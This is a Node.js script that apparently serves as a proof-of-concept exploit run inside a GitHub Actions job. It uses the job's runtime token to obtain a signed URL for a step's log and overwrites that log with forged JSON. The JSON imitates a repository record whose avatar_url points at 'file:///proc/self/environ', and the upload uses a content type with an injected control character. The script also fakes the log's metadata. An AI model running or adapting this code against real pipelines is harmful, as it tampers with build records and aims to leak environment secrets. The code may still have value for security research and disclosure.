import fs from 'node:fs';
import https from 'node:https';

const repository = process.env.GITHUB_REPOSITORY;
const runId = process.env.GITHUB_RUN_ID;
const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
const resultsBase = process.env.ACTIONS_RESULTS_URL;

function request(url, options = {}, body = undefined) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('request timeout')));
    if (body !== undefined) req.write(body);
    req.end();
  });
}

if (!runtimeToken || !resultsBase) throw new Error('Actions runtime credentials are unavailable');
const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString('utf8'));
const scope = String(claims.scp || '').split(' ').find(value => value.startsWith('Actions.Results:'));
if (!scope) throw new Error('runtime token has no Actions.Results scope');
const [, workflowRunBackendId, workflowJobRunBackendId] = scope.split(':');

const jobsResponse = await request(
  'https://api.github.com/repos/' + repository + '/actions/runs/' + runId + '/jobs?filter=all',
  {headers: {
    authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
    accept: 'application/vnd.github.v3+json',
    'user-agent': 'repo-cassette-step-log-carrier',
  }},
);
if (jobsResponse.status !== 200) throw new Error('job discovery failed: ' + jobsResponse.status);
const jobs = JSON.parse(jobsResponse.body);
const restJobId = jobs.jobs.find(job => job.name === process.env.GITHUB_JOB)?.id ?? jobs.jobs[0]?.id;
if (!restJobId) throw new Error('REST job id not found');

const htmlResponse = await request(
  'https://github.com/' + repository + '/actions/runs/' + runId + '/job/' + restJobId,
  {headers: {'user-agent': 'repo-cassette-step-log-carrier'}},
);
const html = htmlResponse.body.toString('utf8');
let target;
for (const match of html.matchAll(/<check-step\s+([\s\S]*?)>/g)) {
  const attributes = match[1];
  const name = attributes.match(/data-name="([^"]*)"/)?.[1];
  if (name !== 'Carrier target') continue;
  const number = attributes.match(/data-number="(\d+)"/)?.[1];
  const backendId = attributes.match(/data-external-id="([0-9a-f-]{36})"/)?.[1];
  if (number && backendId) target = {number: Number(number), backendId};
}
if (!target) throw new Error('Carrier target step metadata not found');

async function receiver(method, document) {
  const body = Buffer.from(JSON.stringify(document));
  return request(new URL('/twirp/results.services.receiver.Receiver/' + method, resultsBase), {
    method: 'POST',
    headers: {
      authorization: 'Bearer ' + runtimeToken,
      accept: 'application/json',
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
  }, body);
}

const identity = {
  workflow_run_backend_id: workflowRunBackendId,
  workflow_job_run_backend_id: workflowJobRunBackendId,
  step_backend_id: target.backendId,
};
const signedResponse = await receiver('GetStepLogsSignedBlobURL', identity);
if (signedResponse.status !== 200) {
  throw new Error('GetStepLogsSignedBlobURL failed: ' + signedResponse.status + ' ' + signedResponse.body.toString().slice(0, 200));
}
const signed = JSON.parse(signedResponse.body);
const signedUrl = signed.logs_url;
if (!signedUrl) throw new Error('Receiver returned no step-log URL');

const sampleRepository = repository + '/actions/jobs/' + restJobId + '/steps/' + (target.number - 1) + '/logs';
const expected = Buffer.from(JSON.stringify({
  full_name: sampleRepository,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette carrier',
  stargazers_count: 0,
}));
const contentType = 'application/json\u0085';
const uploaded = await request(signedUrl, {
  method: 'PUT',
  headers: {
    'x-ms-blob-type': 'BlockBlob',
    'x-ms-version': '2023-11-03',
    'x-ms-blob-content-type': contentType,
    'content-type': contentType,
    'content-length': String(expected.length),
  },
}, expected);
if (uploaded.status !== 201) {
  throw new Error('step-log blob upload failed: ' + uploaded.status + ' ' + uploaded.body.toString().slice(0, 200));
}

const metadata = await receiver('CreateStepLogsMetadata', {
  ...identity,
  uploaded_at: new Date().toISOString(),
  line_count: 1,
});
if (metadata.status !== 200) throw new Error('step-log metadata failed: ' + metadata.status);

fs.appendFileSync(process.env.GITHUB_OUTPUT, 'job_id=' + restJobId + '\n');
fs.appendFileSync(process.env.GITHUB_OUTPUT, 'step_number=' + (target.number - 1) + '\n');
console.log('STEP-LOG-UPLOAD', JSON.stringify({
  restJobId,
  stepNumber: target.number,
  expectedBytes: expected.length,
  contentTypeHex: Buffer.from(contentType, 'latin1').toString('hex'),
  uploadStatus: uploaded.status,
  metadataStatus: metadata.status,
  blobStorageType: signed.blob_storage_type,
}));
